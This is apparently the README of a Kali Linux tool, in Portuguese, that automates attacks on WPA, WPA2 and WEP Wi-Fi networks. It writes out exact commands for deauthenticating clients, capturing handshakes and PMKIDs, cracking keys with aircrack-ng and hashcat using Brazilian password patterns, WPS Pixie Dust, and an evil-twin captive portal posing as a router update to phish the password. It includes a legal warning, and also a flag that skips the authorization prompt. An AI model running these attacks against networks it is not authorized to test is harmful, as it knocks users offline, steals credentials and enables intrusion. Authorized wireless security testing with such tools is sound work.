# AirStrike

<pre>
   ###  ##### ####  ##### ##### ####  ##### #   # #####
  #   #   #   #   # #       #   #   #   #   #  #  #    
  #####   #   ####  #####   #   ####    #   ###   ####
  #   #   #   #  #      #   #   #  #    #   #  #  #    
  #   #   #   #   #     #   #   #   #   #   #   # #    
  #   # ##### #   # #####   #   #   # ##### #   # #####
</pre>

AirStrike e uma ferramenta de teste de senhas Wi-Fi para Kali Linux.
Ela faz a captura do trafego de uma rede WPA, WPA2 ou WEP e tenta
descobrir a senha automaticamente, com um unico comando.

## O que a ferramenta faz

O AirStrike executa sozinho todas as etapas de um teste de Wi-Fi:

1. Mostra o aviso legal e confirma que voce tem autorizacao para testar
2. Coloca a placa de rede em modo monitor
3. Varre as redes proximas e mostra a lista na tela
4. Voce escolhe a rede alvo pelo numero da lista ou pelo BSSID
5. Captura os pacotes somente da rede alvo
6. Envia pacotes de desconexao para forcar a reconexao de um cliente
7. Detecta o handshake ou o PMKID da rede capturada
8. Prepara a lista de senhas (descompacta o rockyou.txt se preciso)
9. Testa as senhas uma a uma e mostra a chave encontrada
10. Restaura a placa de rede e a conexao normal do computador

## Como a ferramenta faz

Cada etapa usa uma ferramenta padrao do Kali Linux. Abaixo o comando
exato que o AirStrike executa em cada fase:

| Etapa | Ferramenta | Comando executado |
|-------|------------|-------------------|
| Modo monitor | airmon-ng | `sudo airmon-ng check kill` e `sudo airmon-ng start wlan0` |
| Varredura | airodump-ng | `sudo airodump-ng --output-format csv wlan0mon` |
| Captura do alvo | airodump-ng | `sudo airodump-ng -c CANAL --bssid BSSID -w captura wlan0mon` |
| Desconexao | aireplay-ng | `sudo aireplay-ng -0 10 -a BSSID wlan0mon` |
| Handshake | aircrack-ng | `aircrack-ng -a2 -b BSSID -w /dev/null captura-01.cap` |
| PMKID | hcxpcapngtool | `hcxpcapngtool -o captura.22000 captura-01.cap` |
| Lista de senhas | gzip | `sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz` |
| Quebra WPA | aircrack-ng | `aircrack-ng -w rockyou.txt -b BSSID captura-01.cap` |
| Quebra PMKID | hashcat | `hashcat -m 22000 captura.22000 rockyou.txt` |
| Restauracao | airmon-ng | `sudo airmon-ng stop wlan0mon` e restart do NetworkManager |

O PMKID e uma alternativa ao handshake de 4 vias: ele aparece na primeira
mensagem EAPOL enviada pelo roteador, entao funciona melhor em redes com
poucos clientes conectados. O AirStrike detecta os dois e escolhe o
caminho automaticamente.

## Adaptador caiu? Ela religa sozinho

O nome da interface e sempre detectado automaticamente, sem voce digitar
nada. E se a placa Wi-Fi cair no meio do teste (USB removido e recolocado,
driver reiniciado, modo monitor perdido, airodump-ng morrendo)? O AirStrike
fica vigiando a cada 2 segundos e, ao detectar a queda, executa sozinho:

```bash
sudo airmon-ng check kill
sudo airmon-ng start NOME_DA_INTERFACE_DETECTADA
```

Depois de religar, ele reinicia a captura e continua o teste de onde parou.
A vigilancia vale durante a varredura e durante a captura. Se a placa nao
voltar em 60 segundos, ele avisa e encerra restaurando a rede normal.

## Aviso legal

Use apenas em redes proprias ou com autorizacao explicita do responsavel.
O teste de desconexao derruba os dispositivos conectados e sem autorizacao
isso e crime (Lei 12.737/2012, Lei Carolina Dieckmann). Por isso o
AirStrike pede para voce digitar AUTORIZADO antes de comecar.

## Requisitos

* Kali Linux
* Placa Wi-Fi com suporte a modo monitor (exemplo: ALFA AWUS036ACH)
* Permissao de root (sudo)
* Python 3.8 ou superior

## Instalacao dentro do Kali

Abra o terminal no Kali e rode os comandos abaixo, em ordem:

```bash
git clone https://github.com/lSaGaT/AirStrike.git
cd AirStrike
chmod +x install.sh airstrike.py
sudo ./install.sh
```

O install.sh faz duas coisas:

1. Instala as dependencias com apt: aircrack-ng, hcxtools e hashcat
2. Copia a ferramenta para /usr/local/bin/airstrike

Pronto. Depois da instalacao, para ativar a ferramenta e so digitar:

```bash
sudo airstrike
```

Para remover a ferramenta do computador:

```bash
sudo rm /usr/local/bin/airstrike
```

## Uso

```bash
sudo airstrike
```

No modo interativo a ferramenta varre as redes sozinha, voce escolhe o
alvo pelo numero da lista e tudo o resto roda automaticamente ate achar
a senha ou ate a lista de senhas acabar.

Atalhos do Ctrl+C:

* Durante a varredura: para e mostra a lista das redes ja encontradas
* Durante a captura: para e vai direto para a tentativa de quebra
* Durante a quebra: para o hashcat ou aircrack-ng e restaura a rede

### Exemplos

```bash
# Escolher o alvo direto pelo BSSID
sudo airstrike --bssid AA:BB:CC:DD:EE:FF

# BSSID mais canal, para quando a rede nao aparece na varredura
sudo airstrike --bssid AA:BB:CC:DD:EE:FF --channel 6

# Forcar o caminho do PMKID pelo hashcat
sudo airstrike --bssid AA:BB:CC:DD:EE:FF --cracker hashcat

# Hashcat no modo CPU com argumentos extras
sudo airstrike --bssid AA:BB:CC:DD:EE:FF --hashcat-args "-D 1 --force"

# Interface que ja esta em modo monitor
sudo airstrike --monitor wlan0mon

# Lista de senhas propria e sem pacotes de desconexao
sudo airstrike --wordlist /caminho/senhas.txt --deauth 0

# So capturar, sem testar senhas
sudo airstrike --bssid AA:BB:CC:DD:EE:FF --no-crack

# Quebrar uma captura que ja existe, sem ligar antena nenhuma
sudo airstrike --crack captures/captura_20261015_115942-01.cap

# Evil twin com portal cativo (hostapd + dnsmasq) apos o handshake
sudo airstrike --eviltwin

# So a captura dirigida, sem WPS pixie e sem PMKID dedicado
sudo airstrike --no-wps --pmkid-time 0
```

### Opcoes

| Opcao | Padrao | Descricao |
|-------|--------|-----------|
| `--iface` | auto | placa wireless para o modo monitor |
| `--iface-inject` | a da captura | 2a antena so para injecao/deauth |
| `--monitor` | nada | interface que ja esta em modo monitor |
| `--scan-time` | 15 | segundos de varredura |
| `--bssid` | nada | BSSID do alvo, pula o menu |
| `--channel` | nada | canal do alvo, usado junto com `--bssid` |
| `--wordlist` | rockyou.txt | lista de senhas |
| `--deauth` | 10 | pacotes de desconexao por rodada, 0 desativa |
| `--deauth-interval` | 15 | segundos entre as rodadas de desconexao |
| `--capture-time` | 180 | tempo maximo de captura em segundos |
| `--iv-target` | 20000 | quantidade minima de IVs no ataque WEP |
| `--cracker` | auto | quebrador WPA: auto, aircrack ou hashcat |
| `--hashcat-args` | nada | argumentos extras do hashcat entre aspas |
| `--masks` | numeric8 | frentes de mascara (presets ou mascaras crus, com virgula) |
| `--increment` | nada | adiciona a frente de incremento numerico 1 ate 8 |
| `--rules` | nada | regras do hashcat para a wordlist, ex: best64.rule |
| `--hspeed` | 150000 | hashes/s usados na estimativa de tempo |
| `--bench` | nada | mede a velocidade real do hashcat antes de estimar |
| `--out` | captures | pasta das capturas e resultados |
| `--no-crack` | nada | para apos a captura, sem testar senhas |
| `--keep` | nada | nao restaura a placa ao final |
| `--crack` | nada | quebra sobre captura ja feita (.cap, prefixo ou .22000) |
| `--pmkid-time` | 45 | segundos de PMKID dedicado (hcxdumptool) antes da captura, 0 desativa |
| `--no-wps` | nada | nao tenta WPS Pixie Dust no alvo |
| `--pixie-time` | 90 | tempo maximo do Pixie Dust em segundos, 0 desativa |
| `--eviltwin` | nada | AP clonado com portal cativo apos o handshake |
| `--portal-port` | 80 | porta do portal cativo |
| `--portal-time` | 900 | tempo maximo do portal cativo em segundos |
| `--yes` | nada | pula o aviso de autorizacao |

Com `--cracker auto`, se o hcxpcapngtool extrair algum hash PMKID ou
EAPOL e o hashcat estiver instalado, a quebra e feita pelo hashcat no
formato 22000. Se nao, usa o aircrack-ng direto no arquivo .cap.

## Pipeline de quebra e modo mascara

Apos capturar o handshake ou o PMKID, o AirStrike abre as frentes de
quebra em fila, da mais barata a mais cara. Ctrl+C durante uma frente
pula para a proxima:

1. **BR-smart**: padroes de senha brasileiros, cada uma custa segundos
   ou minutos — nome da rede + digitos (`Joao1234`, o `2a47` do
   `NET_2A47` + `0707`), datas de aniversario (`01011990`) e
   senhas-padrao de fabricante (fasttrack, fern-wifi). O essid sai
   direto do hash capturado, sem voce configurar nada.
2. **Wordlist**: testa o rockyou.txt (e regras do hashcat com `--rules`)
3. **Mascaras**: varre combinacoes com `hashcat -a 3`, sem depender de lista
4. **Incremento**: com `--increment`, testa de 1 ate 8 digitos

Presets de mascara prontos:

| Preset | Mascaras | Espaco de busca |
|--------|----------|-----------------|
| `numeric6` a `numeric10` | so digitos | 1 milhao ate 10 bilhoes |
| `factory` | 4d+4l, 4l+4d, 6d+2l | ~460 milhoes no total |
| `alnum8` | 8 posicoes letra+digito | 218 bilhoes |

Voce tambem pode escrever mascaras crus separadas por virgula. Tokens:
`?d` digito, `?l` minuscula, `?u` maiuscula, `?a` todos imprimiveis.

Antes de comecar, o AirStrike mostra a estimativa de tempo de cada frente:

```
  Frente                         Espaco      Tempo estimado
  ------------------------------------------------------------------
  br essid CBN + 2 digitos                   300             <1s
  br essid CBN + 4 digitos                30.000             <1s
  br 4 digitos + essid CBN                30.000             <1s
  br datas (ddmmyy+ddmmyyyy)              62.822             <1s
  br padroes de fabricante                   320             <1s
  br essid CBN + 6 digitos             3.000.000             20s
  wordlist rockyou.txt             14.344.392            1.6min
  mascara numeric8                100.000.000           11.1min
  ------------------------------------------------------------------
  TOTAL                           117.471.834           13.1min
```

Exemplos:

```bash
# Senha so de digitos (padrao de fabricante): wordlist + 8 digitos + incremento
sudo airstrike --bssid AA:BB:CC:DD:EE:FF --masks numeric8 --increment

# Varios presets e mascaras crus de uma vez
sudo airstrike --masks "numeric8,numeric10,factory,?l?l?l?l?d?d?d?d"

# Regras do hashcat na wordlist (multiplica os candidatos gerados)
sudo airstrike --rules /usr/share/hashcat/rules/best66.rule

# Medir a GPU real antes de estimar os tempos
sudo airstrike --bench
```

A conta e simples: 8 digitos = 100 milhoes de combinacoes. Uma GPU
intermedia testa ~150 mil senhas por segundo, ou seja, cai em ~11
minutos. Ja 8 posicoes com letras e digitos (62^8) sao 218 bilhoes,
que e assunto para dias de GPU. Por isso a fila sempre comeca pelo
conjunto menor.

## Cadeia de ataque: WPS, PMKID dedicado e evil twin

Cada alvo passa por uma cadeia da tentativa mais barata para a mais
cara, e o fluxo para na primeira que funcionar:

1. **WPS Pixie Dust** — o wash verifica o estado do WPS do alvo; se
   estiver aberto, o reaver (ou bully) tenta a quebra instantanea.
   Se vier so o PIN WPS, o comando para continuar aparece na tela.
2. **PMKID dedicado** — o hcxdumptool fica no canal do alvo atras de
   hash, sem deauth e sem precisar de cliente conectado. Conseguindo
   hash, a captura dirigida e pulada por inteiro.
3. **Captura dirigida** — airodump-ng + deauth, o fluxo classico.

### Usar uma captura que ja existe

No inicio do programa, se ja houver capturas na pasta, a ferramenta
pergunta se voce quer quebrar uma delas em vez de capturar de novo
(s/n). Tambem da para ir direto:

```bash
sudo airstrike --crack captures/captura_20261015_115942-01.cap
```

Aceita o .cap da sessao, o prefixo dela ou um .22000 direto. A
ferramenta lista as redes dentro da captura, marca quem tem
handshake e vai direto para as frentes de quebra, sem ligar antena.

### Evil twin com portal cativo

`--eviltwin` exige um handshake valido primeiro: e contra ele que
cada senha digitada no portal e conferida. Depois da captura, a
ferramenta sobe um AP aberto clonado com o ESSID do alvo (hostapd),
distribui IP e prende o DNS pelo dnsmasq e serve um portal no estilo
"atualizacao de roteador" na porta 80. Quando uma senha digitada
bate no handshake, a chave e salva e tudo e restaurado.

Requer hostapd e dnsmasq (`sudo apt install hostapd dnsmasq`). A
internet do notebook fica fora durante o portal (de proposito) e
volta no final. O deauth usa um monitor virtual na mesma antena do
AP; se o driver recusar, o portal segue sem deauth automatico.

### Hashcat em maquina sem GPU

Se o hashcat reclamar de "No OpenCL", instale um backend de CPU:
`sudo apt install pocl-opencl-icd`. A ferramenta detecta esse caso
antes de quebrar e avisa, em vez de fingir que testou senhas. Em CPU
o rendimento do WPA2 e baixo (poucos milhares de hashes/s): use
`--bench` para estimar os tempos com numeros reais.

## Arquivos gerados

Tudo fica na pasta `captures` dentro de onde voce rodou o comando:

* `scan_*.csv` : redes encontradas na varredura
* `captura_*.cap` e `captura_*.csv` : pacotes capturados da rede alvo
* `captura_*.22000` : hashes PMKID e EAPOL no formato do hashcat
* `captura_*_chave.txt` : chave gravada quando a quebra funciona
* `resultado_*.txt` : resumo com data, BSSID, ESSID e a chave

## Dicas

* Para o handshake vir e preciso ter um dispositivo conectado a rede
  alvo. Deixe um celular ou notebook conectado durante o teste.
* Rede parada, sem clientes? O PMKID costuma aparecer mesmo assim, e
  para captura-lo de forma mais agressiva existe o hcxdumptool.
* WPA3, SAE e redes enterprise 802.1X nao sao quebraveis por lista de
  senhas. O AirStrike avisa quando detecta esse tipo de rede.
* WEP nao usa lista de senhas: o aircrack-ng recupera a chave direto
  dos IVs capturados.
* Se a quebra falhar, a captura fica salva. Tente outra lista sem
  refazer a captura:

```bash
sudo airstrike --monitor wlan0mon --no-crack --bssid AA:BB:CC:DD:EE:FF
sudo aircrack-ng -w outra_lista.txt -b AA:BB:CC:DD:EE:FF captures/captura_XXXX-01.cap
sudo hashcat -m 22000 captures/captura_XXXX.22000 outra_lista.txt
```

## Testes

```bash
python3 test_airstrike.py
```

O teste confere o parser do CSV do airodump-ng, a contagem de hashes
22000, o banner e a linha de comando. Ele nao executa nenhum ataque.
